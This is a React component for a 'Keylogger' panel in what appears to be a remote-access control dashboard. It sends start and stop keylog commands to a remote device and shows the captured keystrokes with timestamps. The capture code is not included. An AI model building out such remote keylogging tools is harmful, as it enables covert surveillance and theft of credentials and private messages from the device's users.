import { Trash2 } from 'lucide-react';
import { motion } from 'motion/react';
import { useEffect, useRef, useState } from 'react';
import { useGateway } from '../../services';
import { HelpButton } from '../HelpButton';
import { Button } from '../ui/button';

interface KeyloggerProps {
  backendId: string;
}

export function Keylogger({ backendId }: KeyloggerProps) {
  const { activeClient, sendCommand } = useGateway();
  const keylogContainerRef = useRef<HTMLDivElement>(null);

  // Optimistic local state
  const [localActive, setLocalActive] = useState(false);

  // Get real state from backend
  const backendState = activeClient?.state.keylogger || 'idle';
  const keylogs = activeClient?.keylogs || [];

  // Use optimistic state for immediate UI feedback
  const isActive = localActive || backendState === 'active';

  // Sync local state with backend state
  useEffect(() => {
    if (backendState === 'active') {
      setLocalActive(true);
    } else if (backendState === 'idle') {
      setLocalActive(false);
    }
  }, [backendState]);

  // Auto-scroll keylogs
  useEffect(() => {
    if (keylogContainerRef.current) {
      keylogContainerRef.current.scrollTop = keylogContainerRef.current.scrollHeight;
    }
  }, [keylogs]);

  const handleStart = () => {
    sendCommand('start_keylog');
    setTimeout(() => setLocalActive(true), 500); // 500ms delay
  };

  const handleStop = () => {
    sendCommand('stop_keylog');
    setTimeout(() => setLocalActive(false), 500); // 500ms delay
  };

  return (
    <div className="h-full flex flex-col p-6">
      <div className="flex items-center justify-between mb-6">
        <div className="flex items-center gap-3">
          <h3 className="text-2xl">Keylogger</h3>
          <HelpButton
            title="Keylogger"
            description="Capture keystrokes from the remote device in real-time."
            instructions={[
              'Click "Start Keylogger" to begin capturing',
              'Keystrokes appear in the terminal below',
              'Click "Stop Keylogger" to end the session',
            ]}
          />
        </div>
        {isActive && keylogs.length > 0 && (
          <Button variant="outline" size="sm">
            <Trash2 className="w-4 h-4 mr-2" /> Clear Logs
          </Button>
        )}
      </div>

      {!isActive ? (
        <div className="flex-1 bg-gray-50 rounded-xl flex items-center justify-center">
          <motion.div
            initial={{ opacity: 0, scale: 0.95 }}
            animate={{ opacity: 1, scale: 1 }}
            className="text-center max-w-md"
          >
            <div className="w-20 h-20 bg-black rounded-2xl flex items-center justify-center mx-auto mb-6">
              <svg width="40" height="40" viewBox="0 0 24 24" fill="none">
                <rect x="3" y="6" width="18" height="12" rx="2" stroke="white" strokeWidth="2"/>
                <path d="M7 10H7.01M11 10H11.01M15 10H15.01M7 14H17" stroke="white" strokeWidth="2" strokeLinecap="round"/>
              </svg>
            </div>
            <h4 className="text-xl mb-3">Keylogger</h4>
            <p className="text-gray-600 mb-6">
              Capture keystrokes from the remote device in real-time
            </p>
            <Button
              onClick={handleStart}
              className="bg-black hover:bg-gray-800 text-white"
            >
              Start Keylogger
            </Button>
          </motion.div>
        </div>
      ) : (
        <div className="flex-1 flex flex-col gap-4">
          {/* Keylog Display */}
          <div
            ref={keylogContainerRef}
            className="flex-1 bg-gray-900 rounded-xl overflow-hidden p-4 font-mono text-sm text-green-400 overflow-y-auto"
          >
            {keylogs.length === 0 ? (
              <motion.div
                animate={{ opacity: [0.4, 1, 0.4] }}
                transition={{ duration: 2, repeat: Infinity }}
                className="text-gray-500"
              >
                Waiting for keystrokes...
              </motion.div>
            ) : (
              keylogs.map((log, idx) => (
                <motion.div
                  key={idx}
                  initial={{ opacity: 0, x: -10 }}
                  animate={{ opacity: 1, x: 0 }}
                  className="mb-1"
                >
                  <span className="text-gray-500">[{new Date(log.timestamp).toLocaleTimeString()}]</span> {log.text}
                </motion.div>
              ))
            )}
          </div>

          {/* Status Bar */}
          <div className="bg-black/70 backdrop-blur-sm text-white px-4 py-3 rounded-xl flex items-center justify-between">
            <div className="flex items-center gap-3">
              <div className="flex items-center gap-2">
                <div className="w-2 h-2 bg-green-500 rounded-full animate-pulse" />
                <span className="text-sm">Keylogger Active</span>
              </div>
              <span className="text-sm text-gray-400">• {keylogs.length} keystrokes</span>
            </div>
            <Button
              onClick={handleStop}
              variant="outline"
              size="sm"
              className="border-red-400 text-red-400 hover:bg-red-400/20"
            >
              Stop Keylogger
            </Button>
          </div>
        </div>
      )}
    </div>
  );
}
